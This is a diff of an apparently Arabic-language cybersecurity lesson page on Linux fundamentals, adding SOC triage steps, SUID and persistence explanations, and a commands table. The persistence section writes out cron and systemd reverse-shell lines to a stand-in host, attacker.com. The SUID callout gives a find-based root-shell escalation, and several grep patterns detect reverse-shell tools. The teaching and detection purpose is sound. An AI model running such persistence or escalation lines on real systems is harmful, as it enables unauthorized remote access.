@@ -6,11 +6,61 @@ export default function Page() {
     <LessonShell slug="linux-fundamentals">
       <L
         ar={<>
-          <Section title="ليه Linux الأول قبل أي حاجة؟">
-            <p>كل أداة هجومية ودفاعية مهمة بتشتغل على Linux. Kali، Parrot، سيرفرات الإنترنت، معظم ICS، الـ containers، وحتى Android تحته Linux. ما تقدرش تبقى محترف أمن من غير ما تبقى مرتاح في الـ command line.</p>
+          <Section title="ليه أنت محتاج Linux أصلاً؟">
+            <p>تخيل السيناريو ده. أنت analyst جديد في SOC. الساعة 3 الفجر، alert: "suspicious outbound connection from web-prod-01". تفتح الـ ticket. السيرفر Linux. أنت طول عمرك Windows.</p>
+            <p>دخلت SSH. شفت prompt أسود. كتبت <span className="eng">dir</span>. قال "command not found". كتبت <span className="eng">tasklist</span>. نفس الحكاية.</p>
+            <p>حاولت تفتح Task Manager. مفيش. حاولت تشوف الـ network connections من واجهة. مفيش. والـ attacker لسه شغّال جوّه. والمدير بيسألك كل 10 دقايق "إيه الموقف؟".</p>
+            <p>الموقف؟ أنت ضايع. مش لإنك غبي — لإن أنت ما اتعلمتش الأداة.</p>
+            <p>كل أداة هجومية وحمائية محترمة بتشتغل على Linux. Kali، Parrot، 70% من سيرفرات الإنترنت، معظم الـ ICS، كل الـ containers، Android تحته Linux، حتى الـ macOS الـ shell بتاعه قريب جداً منه.</p>
+            <p>اوعى تقنع نفسك إنك ممكن تبقى محترف أمن وأنت بتخاف من الـ terminal. خلاص. الموضوع مش "نصيحة"، ده شرط دخول.</p>
             <Callout kind="info" title="الهدف من الدرس">
-              بعد ما تخلّصه هتفهم: الـ filesystem، الصلاحيات، العمليات، الشبكة، والأوامر اللي هتكتبها كل يوم في أي pentest.
+              بعد ما تخلّصه هتفهم: الـ filesystem، الصلاحيات، العمليات، الشبكة، الـ persistence mechanisms، والأوامر اللي هتكتبها كل يوم — سواء أنت Red ولا Blue.
             </Callout>
+          </Section>
+
+          <Section title="القصة كاملة — تحقيق على سيرفر مخترق بأدوات أساسية بس">
+            <p>خلّيني أمشّيك على سيناريو حقيقي. وصلك alert: "outbound traffic to suspicious IP". السيرفر <span className="eng">web-prod-01</span>. مفيش EDR. مفيش XDR. عندك SSH وأدوات الـ base system. ابدأ.</p>
+            <Step n={1} title="مين أنا ومين شغّال على السيرفر؟">
+              <Terminal lines={[
+                { p: "id                       # # هويتي دلوقتي" },
+                { p: "who                      # # مين logged in حالياً" },
+                { p: "last -20                 # # آخر 20 login — في حد دخل في وقت غريب؟" },
+                { p: "lastb -20                # # محاولات login فاشلة — brute force؟" },
+              ]} />
+            </Step>
+            <Step n={2} title="إيه اللي شغّال؟">
+              <Terminal lines={[
+                { p: "ps auxf                  # # كل العمليات بشكل شجري" },
+                { p: "ps aux | grep -E 'nc|wget|curl|python|perl|bash -i'    # # أدوات بتستخدم في reverse shells" },
+                { p: "ps aux --sort=-%cpu | head    # # أعلى استهلاك CPU — miner؟" },
+              ]} />
+              <p>لو لقيت <span className="eng">python -c 'import socket...'</span> أو <span className="eng">bash -i &gt;&amp; /dev/tcp/...</span>، ده reverse shell. صوّر الـ screen، ما تقفلش العملية لحد ما تجمع الأدلة.</p>
+            </Step>
+            <Step n={3} title="الشبكة بتقول إيه؟">
+              <Terminal lines={[
+                { p: "ss -tunap                # # كل اتصالات TCP/UDP + العملية المالكة" },
+                { p: "ss -tunap | grep ESTAB   # # اتصالات قائمة دلوقتي" },
+                { p: "# # اتصال طالع لـ IP غريب؟ خد الـ PID وروح اعرف العملية:" },
+                { p: "ls -la /proc/<PID>/exe   # # المسار الفعلي للـ binary" },
+                { p: "cat /proc/<PID>/cmdline | tr '\\0' ' '    # # الأمر كامل" },
+              ]} />
+            </Step>
+            <Step n={4} title="فيه ملفات اتلمست لسه؟">
+              <Terminal lines={[
+                { p: "find / -type f -mmin -60 -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null" },
+                { p: "find /tmp /var/tmp /dev/shm -type f 2>/dev/null    # # المهاجمين بيحبوا الأماكن دي" },
+                { p: "find / -perm -4000 -type f -newer /etc/hostname 2>/dev/null    # # SUID جديد — privesc backdoor" },
+              ]} />
+            </Step>
+            <Step n={5} title="السجلات">
+              <Terminal lines={[
+                { p: "grep 'Accepted' /var/log/auth.log | tail -50    # # logins ناجحة" },
+                { p: "grep 'sudo' /var/log/auth.log | tail -50         # # sudo activity" },
+                { p: "history                  # # تاريخ الـ shell — لو المهاجم نسي يمسحه" },
+                { p: "cat ~/.bash_history /home/*/.bash_history 2>/dev/null" },
+              ]} />
+            </Step>
+            <p>كل ده بأدوات base system. مفيش tool فاخر. ده اللي بنقصد بيه "تبقى مرتاح في الـ command line".</p>
           </Section>
 
           <Section title="نظام الملفات — الخريطة">
@@ -45,6 +95,7 @@ export default function Page() {
 
           <Section title="الصلاحيات — أهم مفهوم تفهمه">
             <p>كل ملف ليه تلات مجموعات صلاحيات: المالك، الجروب، باقي الناس. وكل مجموعة ليها تلات حروف: <span className="eng">r</span> قراءة، <span className="eng">w</span> كتابة، <span className="eng">x</span> تنفيذ. بسيطة لما تستوعبها، خطيرة لما تتجاهلها.</p>
+            <p>زي ما البواب يقفل الباب الكبير ويسيب شباك الحمام مفتوح. الـ permissions لو واحد فيهم غلط، الباقي مالوش لازمة.</p>
             <Code lang="text">{`-rwxr-xr--  1 alice  staff  120 Apr 30 10:15 script.sh
  │└┬┘└┬┘└┬┘
  │ │  │  └── الجميع: قراءة فقط
@@ -56,10 +107,21 @@ export default function Page() {
               { p: "chmod +x script.sh    # أضف تنفيذ" },
               { p: "chown alice:staff f   # غيّر المالك والمجموعة" },
               { p: "" },
-              { p: "# في الأمن: ابحث عن SUID — ملفات تعمل بصلاحيات مالكها:" },
+              { p: "# # في الأمن: ابحث عن SUID — ملفات تشتغل بصلاحيات مالكها:" },
               { p: "find / -perm -4000 -type f 2>/dev/null" },
-              { p: "# هذه قائمة هامة جداً لـ privilege escalation — راجع GTFOBins" },
+              { p: "# # القائمة دي مهمة جداً لـ privilege escalation — راجع GTFOBins" },
             ]} />
+            <Callout kind="danger" title="قصة الـ SUID — ليه /usr/bin/passwd خطر مفهوم؟">
+              لما أنت user عادي وعايز تغيّر كلمة سرك، الكلمة دي بتتكتب فين؟ في <span className="eng">/etc/shadow</span>. الملف ده <b>root فقط</b> يقدر يكتب فيه. طب أنت كـ user عادي، إزاي بتغيّر كلمتك؟
+              <br /><br />
+              الإجابة: <span className="eng">/usr/bin/passwd</span> عليه <b>SUID bit</b>. يعني لما أنت تشغّله، البرنامج بيشتغل بصلاحيات <b>المالك بتاعه — اللي هو root</b>، مش بصلاحياتك أنت. فبيقدر يكتب في shadow.
+              <br /><br />
+              ده تصميم سليم لـ <span className="eng">passwd</span>. <b>المشكلة:</b> لو في binary تاني عليه SUID وأنت تقدر تتحكم في إدخاله، أنت دلوقتي بتشغّل كود كـ root. مثال: <span className="eng">find</span> عليه SUID؟ <span className="eng">find . -exec /bin/sh \;</span> = root shell فوري.
+              <br /><br />
+              <b>اللي بيحصل فعلياً:</b> أدمن مكسول كتب script لازم يشتغل كـ root، حطّ عليه SUID علشان "يخلّص الموضوع". ما اتنبهش إن أي user يقدر يستغله. أنت كـ pentester بتمشي على <span className="eng">find / -perm -4000</span> وبتلاقي الجوهرة دي.
+              <br /><br />
+              <b>الحماية:</b> <span className="eng">find / -perm -4000 -type f 2&gt;/dev/null</span> دورياً، قارن بقائمة baseline، أي إضافة جديدة = حقّق فيها. ولو ممكن، اشتغل بـ <span className="eng">capabilities</span> بدل SUID — أدق وأقل خطر.
+            </Callout>
           </Section>
 
           <Section title="المستخدمون والـ root">
@@ -139,6 +201,84 @@ echo "hello" | base64
 echo "aGVsbG8K" | base64 -d`}</Code>
           </Section>
 
+          <Section title="قصة الـ Persistence — cron و systemd">
+            <p>المهاجم اللي دخل سيرفرك مش هيقعد بصّ. هو عايز يفضل جوّه حتى لو الـ shell اتقفلت أو السيرفر اتعمله reboot. ده اسمه <b>persistence</b>. وفي Linux، أشهر مكانين: <span className="eng">cron</span> و <span className="eng">systemd</span>.</p>
+            <Step n={1} title="cron — الكلاسيكي اللي مبيموتش">
+              <p>السيناريو: المهاجم دخل بـ web shell. كاتب سطر واحد في <span className="eng">crontab</span>:</p>
+              <Code lang="bash">{`# يشتغل كل 5 دقايق، يفتح reverse shell
+*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'`}</Code>
+              <p>عملت reboot؟ مفيش فرق. قفلت الـ web shell؟ مفيش فرق. كل 5 دقايق، السيرفر بنفسه بيتصل بالمهاجم. <b>ليه ده شغّال؟</b> لإن cron بيشتغل كـ daemon من أول لحظة الـ boot.</p>
+              <p><b>الحماية — كده تلاقيه:</b></p>
+              <Terminal lines={[
+                { p: "# # كل cron jobs لكل user على النظام:" },
+                { p: "for u in $(cut -f1 -d: /etc/passwd); do echo \"=== $u ===\"; crontab -u $u -l 2>/dev/null; done" },
+                { p: "ls -la /etc/cron.* /etc/crontab    # # system-wide crons" },
+                { p: "ls -la /var/spool/cron/crontabs/    # # user crons (Debian/Ubuntu)" },
+                { p: "grep -r 'tcp\\|wget\\|curl\\|bash -i' /etc/cron* /var/spool/cron/ 2>/dev/null" },
+              ]} />
+            </Step>
+            <Step n={2} title="systemd — الجديد، الأنيق، والأخطر">
+              <p>cron قديم وأي blue team عنده alerts عليه. المهاجمين الأذكى انتقلوا لـ systemd. ليه؟ لإن أي service systemd ممكن تكون legitimate، فبيتستّر وسط الضوضاء.</p>
+              <Code lang="bash">{`# /etc/systemd/system/syslog-helper.service
+[Unit]
+Description=System Log Helper
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/attacker.com/4444 0>&1; sleep 60; done'
+Restart=always
+
+[Install]
+WantedBy=multi-user.target`}</Code>
+              <p>بعدها: <span className="eng">systemctl enable --now syslog-helper</span>. الاسم "syslog-helper" مقصود — يخلي الـ admin يعدّيه لما يسكان. الـ service هيعيد نفسه مع الـ boot، ولو فشل هيـ restart نفسه.</p>
+              <p><b>الحماية:</b></p>
+              <Terminal lines={[
+                { p: "systemctl list-unit-files --state=enabled    # # كل services شغّالة مع البوت" },
+                { p: "ls -la /etc/systemd/system/*.service    # # custom services (مش اللي جايين مع الـ packages)" },
+                { p: "systemctl list-units --type=service --state=running" },
+                { p: "# # ابحث عن services بتشغّل bash/python/curl:" },
+                { p: "grep -rE 'ExecStart=.*(bash|python|curl|wget|nc)' /etc/systemd/system/ 2>/dev/null" },
+                { p: "# # أي service مش معروفة، حقّق فيها:" },
+                { p: "systemctl cat <service-name>" },
+              ]} />
+            </Step>
+            <Callout kind="good" title="الحماية / Defense">
+              اكتبها على ظهر إيدك: خد baseline من <span className="eng">crontab -l</span> + <span className="eng">systemctl list-unit-files</span> على سيرفر نضيف. أي اختلاف عن الـ baseline = تحقيق فوري. ولو في المؤسسة، خلي auditd بيراقب <span className="eng">/etc/cron*</span> و <span className="eng">/etc/systemd/system/</span> — أي تعديل فيهم alert.
+              لو ما عملتش الـ baseline ده، أنت ونصيبك.
+            </Callout>
+          </Section>
+
+          <Section title="جدول الأوامر اليومية — اللي هتكتبه فعلاً">
+            <div className="overflow-x-auto">
+              <table className="w-full text-sm border-collapse">
+                <thead>
+                  <tr className="border-b border-slate-700">
+                    <th className="text-start p-2">الموقف</th>
+                    <th className="text-start p-2">الأمر</th>
+                    <th className="text-start p-2">ليه؟</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr className="border-b border-slate-800"><td className="p-2">عرفت إيه شغّال على بورت</td><td className="p-2"><span className="eng">ss -tulpn | grep :443</span></td><td className="p-2">يقولك العملية المالكة كمان، مش بس البورت</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">في حد بياكل CPU</td><td className="p-2"><span className="eng">ps aux --sort=-%cpu | head</span></td><td className="p-2">أعلى 10 عمليات استهلاكاً — miner؟</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">السيرفر بطيء فجأة</td><td className="p-2"><span className="eng">top</span> ثم <span className="eng">iotop</span></td><td className="p-2">CPU ولا I/O؟ كل واحد سبب مختلف</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">تدوّر على ملف</td><td className="p-2"><span className="eng">find / -name "*.conf" 2&gt;/dev/null</span></td><td className="p-2">الـ <span className="eng">2&gt;/dev/null</span> بيكتم رسائل permission denied</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">تدوّر على نص جوّه ملفات</td><td className="p-2"><span className="eng">grep -rni "password" /etc/ 2&gt;/dev/null</span></td><td className="p-2">recursive + case insensitive + line numbers</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">تتابع log حي</td><td className="p-2"><span className="eng">tail -f /var/log/auth.log</span></td><td className="p-2">أي سطر جديد بيظهر فوراً</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">الـ disk اتملا</td><td className="p-2"><span className="eng">du -sh /* 2&gt;/dev/null | sort -h</span></td><td className="p-2">مين أكبر مجلد، human readable</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">لاقيت process مشبوه</td><td className="p-2"><span className="eng">ls -la /proc/&lt;PID&gt;/exe</span></td><td className="p-2">المسار الفعلي للـ binary حتى لو اتمسح</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">ملف غريب في /tmp</td><td className="p-2"><span className="eng">file suspicious.bin</span> + <span className="eng">strings suspicious.bin | head</span></td><td className="p-2">إيه نوعه + أي نصوص جواه</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">بتفك base64</td><td className="p-2"><span className="eng">echo "..." | base64 -d</span></td><td className="p-2">المهاجمين بيخبّوا الأوامر بـ base64</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">بتعمل reverse DNS</td><td className="p-2"><span className="eng">dig -x 8.8.8.8</span></td><td className="p-2">PTR lookup — مين الـ IP ده</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">بتعمل packet capture</td><td className="p-2"><span className="eng">tcpdump -i any -nn -w cap.pcap port 443</span></td><td className="p-2"><span className="eng">-nn</span> = ما تحلّش الـ DNS، أسرع</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">تـ enum users</td><td className="p-2"><span className="eng">{`awk -F: '$3 >= 1000 {print $1}' /etc/passwd`}</span></td><td className="p-2">UIDs &ge; 1000 = users فعليين</td></tr>
+                  <tr className="border-b border-slate-800"><td className="p-2">sudo permissions</td><td className="p-2"><span className="eng">sudo -l</span></td><td className="p-2">إيه اللي مسموح ليّ كـ sudo — أول حاجة في privesc</td></tr>
+                  <tr><td className="p-2">آخر logins</td><td className="p-2"><span className="eng">last -20</span> + <span className="eng">lastb -20</span></td><td className="p-2">ناجح + فاشل، الفرق مهم</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </Section>
+
           <Section title="أهم ملفات تنظر إليها كمدافع/مهاجم">
             <TwoCol>
               <Card title="ملفات اعتماد ومفاتيح" color="red">
@@ -158,11 +298,24 @@ echo "aGVsbG8K" | base64 -d`}</Code>
 
           <Section title="ممارسة">
             <ol>
-              <li>ادخل لـ Kali VM، نفّذ كل أوامر هذا الدرس.</li>
-              <li>أنشئ مستخدمين، اضبط صلاحيات ملفات، اقرأ <span className="eng">/etc/shadow</span> كـ root و كـ مستخدم عادي — افهم الفرق.</li>
-              <li>ابحث عن SUID binaries على Kali، قارن بـ <span className="eng">gtfobins.github.io</span>.</li>
-              <li>اقرأ <span className="eng">man bash</span> — لو مرة واحدة.</li>
+              <li>ادخل لـ Kali VM، ونفّذ كل أوامر الدرس ده. مش تقرأها — تكتبها بإيدك.</li>
+              <li>أنشئ مستخدمين، اضبط صلاحيات على ملفات، اقرأ <span className="eng">/etc/shadow</span> كـ root و كـ user عادي — احس الفرق بنفسك.</li>
+              <li>دور على SUID binaries على Kali، قارن بـ <span className="eng">gtfobins.github.io</span> — جرّب exploit واحد على الأقل.</li>
+              <li>اعمل cron job يكتب timestamp كل دقيقة في <span className="eng">/tmp/test.log</span>، شوفه شغّال، بعدين امسحه.</li>
+              <li>اعمل systemd service بسيطة، فعّلها، شوف <span className="eng">systemctl status</span>، وامسحها بنظافة.</li>
+              <li>اقرأ <span className="eng">man bash</span> — لو مرة واحدة في حياتك.</li>
             </ol>
+          </Section>
+
+          <Section title="الخلاصة الناشفة">
+            <ul>
+              <li>Linux مش option. لو خايف من الـ terminal، أنت مش في المجال ده.</li>
+              <li>الـ filesystem ليه منطق — احفظ <span className="eng">/etc</span>، <span className="eng">/var/log</span>، <span className="eng">/proc</span>، الباقي يجي مع الوقت.</li>
+              <li>SUID = أي binary بصلاحيات مالكه. <span className="eng">find / -perm -4000</span> أول حاجة في privesc.</li>
+              <li>cron + systemd = أشهر مكانين للـ persistence. اعملهم baseline، راقب التغيير.</li>
+              <li>كل alert في SOC على سيرفر Linux، أنت محتاج <span className="eng">ps</span>, <span className="eng">ss</span>, <span className="eng">find</span>, <span className="eng">grep</span> — كده.</li>
+              <li>لو ما اتعلمتش الـ shell، الـ tools الفاخرة مش هتنفعك. هي بتأتمت اللي أنت بتعمله بإيدك. لو ما بتعرفش تعمله بإيدك، الـ tool بيتحوّل لصندوق أسود.</li>
+            </ul>
           </Section>
         </>}
         en={<>
